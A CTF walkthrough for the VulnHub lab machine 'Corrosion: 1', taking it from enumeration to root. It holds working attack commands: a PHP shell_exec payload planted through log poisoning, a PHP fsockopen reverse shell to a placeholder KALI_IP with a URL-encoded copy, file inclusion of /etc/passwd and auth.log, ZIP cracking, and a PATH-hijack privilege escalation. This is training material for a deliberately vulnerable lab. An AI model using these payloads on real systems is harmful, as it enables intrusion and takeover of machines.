---
title: 'Corrosion 1: Vulnhub Walkthrough'
description: "The \"Corrosion: 1\" CTF involved exploiting log poisoning and path abuse for remote command execution and privilege escalation. Key steps included cracking a ZIP file password and exploiting a vulnerable script to gain root access, culminating in the capture of the root flag."
date: 2024-08-10T19:20:39-08:00
featured: false 
draft: false
comment: true
toc: true
pinned: false
carousel: false
series:
  - walkthroughs
categories:
tags:
  - nmap
  - gobuster
  - ffuf
  - dirb
  - linpeas
  - fcrackzip 
images: [corrosion-1.png]
meta:
  reading_time: false
---

## Introduction

| URL | [https://www.vulnhub.com/entry/corrosion-1,730/](https://www.vulnhub.com/entry/corrosion-1,730/) |
| --- | --- |
| Platform | VulnHub |
| Difficulty | ![Static Badge](https://img.shields.io/badge/easy-green) |

The "Corrosion: 1" CTF challenge on VulnHub, though labeled as Easy, presented multiple layers of complexity, including service enumeration, log poisoning, and path abuse to achieve root access. The initial foothold was gained through discovering and exploiting a vulnerable PHP script (randylogs.php) using log poisoning via an SFTP login. This allowed for remote command execution, leading to a reverse shell. Privilege escalation involved identifying a world-readable backup file, cracking a password-protected ZIP file, and leveraging a path abuse vulnerability in a custom script to execute arbitrary commands as root. The challenge concluded with obtaining the root flag, showcasing a combination of enumeration, scripting, and privilege escalation techniques.

## Walkthrough

Run `nmap -A` scan to discover ports 22 & 80 are open:

```shell
└─$ nmap -A -sC 192.168.5.119           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 16:38 UTC
Nmap scan report for 192.168.5.119
Host is up (0.43s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0c:a7:1c:8b:4e:85:6b:16:8c:fd:b7:cd:5f:60:3e:a4 (RSA)
|   256 0f:24:f4:65:af:50:d3:d3:aa:09:33:c3:17:3d:63:c7 (ECDSA)
|_  256 b0:fa:cd:77:73:da:e4:7d:c8:75:a1:c5:5f:2c:21:0a (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-server-header: Apache/2.4.46 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.75 seconds
```

\
Run `gobuster` to find `/tasks/` directory:

```shell
$ gobuster dir -u http://192.168.5.119 -e -r -x html,htm,asp,aspx,jsp,php,cgi,txt,xml -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.119
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,cgi,xml,htm,asp,aspx,jsp,txt,html
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
...
http://192.168.5.119/index.html           (Status: 200) [Size: 10918]
http://192.168.5.119/index.html           (Status: 200) [Size: 10918]
http://192.168.5.119/server-status        (Status: 403) [Size: 278]
http://192.168.5.119/tasks                (Status: 200) [Size: 946]
```

\
Browse to `http://192.168.5.119/tasks/tasks_todo.txt` -

> Tasks that need to be completed
>
> 1. Change permissions for auth log
> 2. Change port 22 -> 7672
> 3. Set up phpMyAdmin

\
Run `dirbuster` to discover additional directories under blog-post, including `blog-post/archives/`:

```shell
└─$ dirb http://192.168.5.119/blog-post/ /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Aug  7 17:14:34 2024
URL_BASE: http://192.168.5.119/blog-post/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.5.119/blog-post/ ----
==> DIRECTORY: http://192.168.5.119/blog-post/archives/                                                                                                   
+ http://192.168.5.119/blog-post/index.html (CODE:200|SIZE:190)                                                                                           
==> DIRECTORY: http://192.168.5.119/blog-post/uploads/                                                                                                    
                                                                                                                                                          
---- Entering directory: http://192.168.5.119/blog-post/archives/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                          
---- Entering directory: http://192.168.5.119/blog-post/uploads/ ----
+ http://192.168.5.119/blog-post/uploads/index.html (CODE:200|SIZE:190)                                                                                   
                                                                                                                                                          
-----------------
END_TIME: Wed Aug  7 17:15:46 2024
DOWNLOADED: 9224 - FOUND: 2
```

\
Browse to `/blog-post/archives/` to discover `randylogs.php`.

Use `ffuf` to discover the "file" parameter for `randylogs.php`:

```shell
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -fs 0 -u http://192.168.5.119/blog-post/archives/randylogs.php?FUZZ=/etc/passwd 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.5.119/blog-post/archives/randylogs.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

file                    [Status: 200, Size: 2832, Words: 38, Lines: 49, Duration: 3ms]
:: Progress: [4614/4614] :: Job [1/1] :: 80 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

\
Send a bit of PHP shell_exec code to the auth.log but using curl to submit the code as the SSH username for an SFTP login. Needed to use curl SFTP instead of the built in SSH client in kali because the client was not allowing special characters as a username:

```shell
└─$ curl -si -u '<?php echo shell_exec($_GET['cmd']);?>' sftp://192.168.5.119/test -k

Enter host password for user '<?php echo shell_exec($_GET[cmd])':
```


**NOTE: Test folder is just a placeholder for SFTP, can use anything**

\
We can now issue shell commands using curl as follows (note the command output is shown where the SSH username would be shown in the auth log):

```shell
└─$ curl -si http://192.168.5.119/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=id

...

Aug  7 19:19:20 corrosion sshd[3498]: Failed password for invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data) from 192.168.9.2 port 57747 ssh2

Aug  7 19:19:22 corrosion sshd[3498]: Connection closed by invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

\
Setup `netcat` listening on kali:

```shell
└─$ nc -nvlp 4242
```

\
PHP command line reverse shell that we will use, change KALI_IP:

```shell
php -r '$sock=fsockopen("KALI_IP",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Encode command at http://www.urlencoder.org, example:

> php%20-r%20%27%24sock%3Dfsockopen%28%22KALI_IP%22%2C4242%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

Use the encoding after the cmd parameter and visit the site:

> http://192.168.5.119/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22KALI_IP%22%2C4242%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

\
Once reverse shell is connected using netcat, get a better interactive shell:

```shell
listening on [any] 4242 ...
connect to [192.168.5.10] from (UNKNOWN) [192.168.5.120] 45710
python3.9 -c 'import pty; pty.spawn("/bin/bash")'
www-data@corrosion:/var/www/html/blog-post/archives$ 

Determining whether we're in an interactive shell:
[[ $- == *i* ]] && echo 'Interactive' || echo 'not-interactive'

Determining whether we're in a login shell:
shopt -q login_shell && echo 'login' || echo 'not-login'
```

\
***OPTIONAL Use the "Upgrading from netcat with magic" method to upgrade a python TTY to a fully interactive shell with tab complete, bash history, working left/right arrow keys, CTRL+C, etc:***

```shell
CTRL+Z   ### Background python TTY
stty raw -echo
fg    ### press ENTER, you won't see your commands echoed. 
reset
export SHELL=bash
export TERM=linux    ### Specify "linux" to run nano, vi, sudoedit, etc.
stty rows 46 columns 169    ### optional, resize window
```

\
Move to `/tmp` directory for write access so you can download and run Linpeas to discover a world-readable backup file at `/var/backups/user_backup.zip`:

```shell
www-data@corrosion:/var/www/html/blog-post/archives$ cd /tmp
www-data@corrosion:/tmp$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
www-data@corrosion:/tmp$ chmod +x linpeas_linux_amd64
www-data@corrosion:/tmp$./linpeas_linux_amd64
...
-rw-r--r-- 1 root root 3285 Jul 30  2021 /var/backups/user_backup.zip
...
```

\
Launch a python web server to serve the backup file for downloading:

```shell
www-data@corrosion:/tmp$ cd /var/backup
www-data@corrosion:/var/backup$ python -m http.server 8080
```

\
Download the backup file onto kali from http://192.168.5.120:8080/user_backup.zip

Use `fcrackzip` to crack the zip file password:

```shell
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt user_backup.zip
PASSWORD FOUND!!!!: pw == !randybaby
```

\
Unzip the backup file using the cracked password:

```shell
└─$ unzip user_backup.zip
Archive:  user_backup.zip
[user_backup.zip] id_rsa password: 
  inflating: id_rsa                  
  inflating: id_rsa.pub              
 extracting: my_password.txt         
  inflating: easysysinfo.c  
```

\
Find randy's SSH password in the file `my_password.txt`:

```shell
└─$ cat my_password.txt 
randylovesgoldfish1998
```

\
Also find the source code for a C file called `easysysinfo` in zip file we downloaded:

```shell
└─$ cat easysysinfo.c  
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("/usr/bin/date");

  system("cat /etc/hosts");

  system("/usr/bin/uname -a");

}
```

***Note the `cat` command does not use an absolute path, we can use path abuse...***

\
SSH into the system using randy's password:

```shell
└─$ ssh randy@192.168.5.120
randy@192.168.5.120's password: 
Welcome to Ubuntu 21.04 (GNU/Linux 5.11.0-25-generic x86_64)
...
randy@corrosion:~$ 
```

\
Run `sudo -l` to find that user randy can run the `easysysinfo` tool as root:

```shell
randy@corrosion:~$ sudo -l
[sudo] password for randy:
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /home/randy/tools/easysysinfo
```

\
Change to the tools directory can create a new bash script named cat:

```shell
randy@corrosion:~$ cd tools
randy@corrosion:~/tools$ nano cat
```

\
Write the following for a basic bash script to spawn shell:

```shell
#!/bin/bash

/bin/bash
```

\
Make the script executable

```shell
randy@corrosion:~/tools$ chmod +x cat
```

\
View current PATH environment variable, then change the PATH variable to /home/randy/tools, so that our local cat script is run instead of the /bin/cat binary:

```shell
randy@corrosion:~/tools$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
randy@corrosion:~/tools$ export PATH="/home/randy/tools"
randy@corrosion:~/tools$ ./easysysinfo
root@corrosion:~/tools# whoami
root
```

\
Set the `PATH` variable back to the original value:

```shell
root@corrosion:~/tools# export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
```

\
Grab the root user password and flag to complete the challenge:

```shell
root@corrosion:~/tools# cat /root/creds/root_creds.txt
рандиистхебест1993
root@corrosion:~/tools# cat /root/root.txt
FLAG: 4NJSA99SD7922197D7S90PLAWE

Congrats! Hope you enjoyed my first machine posted on VulnHub!
Ping me on twitter @proxyprgrammer for any suggestions.

Youtube: https://www.youtube.com/c/ProxyProgrammer
Twitter: https://twitter.com/proxyprgrammer
```